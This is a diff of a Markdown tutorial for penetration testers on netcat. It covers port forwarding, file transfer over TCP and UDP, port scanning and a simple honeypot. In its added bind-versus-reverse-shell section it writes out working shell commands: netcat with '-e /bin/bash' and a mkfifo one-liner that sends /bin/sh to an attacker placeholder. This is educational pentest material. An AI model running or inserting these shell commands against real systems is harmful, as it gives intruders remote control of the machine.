@@ -8,6 +8,10 @@
 1. [Port Forwarding](#1-port-forwarding)
 2. [Swiss Army Knife Concept](#2-swiss-army-knife-concept)
 3. [Netcat](#3-netcat)
+4. [UDP & File Transfer](#4-udp--file-transfer)
+5. [Port Scanning](#5-port-scanning)
+6. [Honeypot](#6-honeypot)
+7. [Bind vs Reverse Shell](#7-bind-vs-reverse-shell)
 
 ---
 
@@ -28,14 +32,12 @@ Penetration testers often need to pivot or access services hidden behind NAT/fir
                                       |
                                       | forwards port 2222 -> 192.168.0.10:22
                                       |
-                            +-------------------+
-                            | Local Network     |
-                            | Device: 192.168.0.10|
-                            | SSH server on :22 |
-                            +-------------------+
+                            +----------------------+
+                            | Local Network        |
+                            | Device: 192.168.0.10 |
+                            | SSH server on :22    |
+                            +----------------------+
 ```
-
-By setting up port forwarding on the router, you make the internal SSH server accessible from the internet on port `2222`.
 
 ---
 
@@ -48,13 +50,13 @@ Similarly, certain pentesting utilities pack multiple networking features into a
 ### Swiss Army Knife for Pentesters
 Tools like `netcat`, `ncat`, `socat`, `cryptcat`, and `sbd` allow you to:
 
-Establish and receive connections  
-Perform banner grabbing  
-Set up simple chat sessions  
-Transfer files over TCP/UDP  
-Deploy basic honeypots  
-Scan ports  
-Execute remote commands
+- Establish and receive connections  
+- Perform banner grabbing  
+- Set up simple chat sessions  
+- Transfer files over TCP/UDP  
+- Deploy basic honeypots  
+- Scan ports  
+- Execute remote commands
 
 ---
 
@@ -73,14 +75,12 @@ Connect to an FTP server on port 21:
 nc www.businesscorp.com.br 21
 ```
 
-You’ll see the FTP banner, indicating a successful TCP handshake and service response.
-
 ---
 
 ### Chat Over Netcat
 You can use Netcat to set up a rudimentary chat between two machines.
 
-#### On the listener (192.168.0.10):
+#### On the listener:
 ```bash
 nc -l -p 4444
 ```
@@ -90,14 +90,9 @@ nc -l -p 4444
 nc 192.168.0.10 4444
 ```
 
-Now anything typed will be sent across the connection.
-
 ---
 
 ### IP Logger Example
-You can use Netcat to quickly identify connections (primitive logger).
-
-#### On the server:
 ```bash
 nc -l -p 5555 > connections.txt
 ```
@@ -105,41 +100,118 @@ Any incoming data will be saved into `connections.txt`.
 
 ---
 
-### Transfer Files
-#### Send a file
+### Transfer Files (TCP)
+#### Listener (receiving the file)
 ```bash
 nc -l -p 6666 > received_file.txt
 ```
-#### On the sender
+#### Sender
 ```bash
 nc 192.168.0.10 6666 < file_to_send.txt
 ```
 
 ---
 
-### Reverse Shell (remote command execution)
-#### Victim machine (listener for shell)
+## 4 – UDP & File Transfer
+
+### Opening a UDP port
 ```bash
-nc -l -p 7777 -e /bin/bash
+nc -vnlup 53
 ```
-#### Attacker connects:
+
+### Connecting via UDP
 ```bash
-nc 192.168.0.10 7777
+nc -vnu <ip> 53
 ```
-> **Note:** The `-e` flag is disabled on many distributions for security reasons. Alternatives include using `/dev/tcp`.
+
+### Transferring a file over UDP (quick example)
+#### On the receiver
+```bash
+nc -u -l -p 1234 > received_file.txt
+```
+#### On the sender
+```bash
+nc -u <ip> 1234 < file_to_send.txt
+```
 
 ---
 
-### Quick Port Scanner
+## 5 – Port Scanning
+
+Netcat can be used as a simple port scanner:
+
 ```bash
-nc -zv 192.168.0.10 20-30
+nc -vnz <ip> 80
 ```
-- `-z` = scan mode (no data sent)
-- `-v` = verbose output
+
+### Scan a range of ports
+```bash
+nc -vnz <ip> 20-100
+```
+
+### Scan common ports on multiple hosts
+You can combine with `xargs`:
+```bash
+echo 192.168.0.{1..10} | xargs -n1 -I{} nc -vnz {} 22-25
+```
 
 ---
 
-## Summary
-Tools like Netcat embody the "Swiss Army Knife" concept: with a single small binary, you can explore, scan, connect, chat, transfer, and even pivot. As a pentester, mastering such tools greatly increases your flexibility in the field.
+## 6 – Honeypot
 
+You can use Netcat to create a very simple honeypot that captures anything sent to it.
+
+```bash
+nc -l -p 8080 > log.txt
+```
+
+Any data sent will be saved into `log.txt`.  
+You can also send an initial message to confuse attackers:
+
+```bash
+while true; do echo "Welcome to HTTP Server" | nc -l -p 8080 >> connections.log; done
+```
+
+---
+
+## 7 – Bind vs Reverse Shell
+
+### Bind Shell
+Target listens on a port and waits for the attacker to connect.  
+- **Attacker initiates the connection.**
+
+#### Example with Netcat:
+```bash
+nc -vnlp 5050 -e /bin/bash
+```
+Then the attacker connects:
+```bash
+nc <target_ip> 5050
+```
+
+---
+
+### Reverse Shell
+Target initiates a connection back to the attacker and sends a shell.  
+- **Useful to bypass inbound firewall restrictions.**
+
+#### On attacker machine (listening):
+```bash
+nc -vnlp 5050
+```
+
+#### On target machine:
+```bash
+nc <attacker_ip> 5050 -e /bin/bash
+```
+
+---
+
+### More Bind & Reverse Shell Examples
+
+#### Using `mkfifo` to avoid disabled `-e`
+```bash
+rm /tmp/f; mkfifo /tmp/f
+cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> 5050 > /tmp/f
+```
 
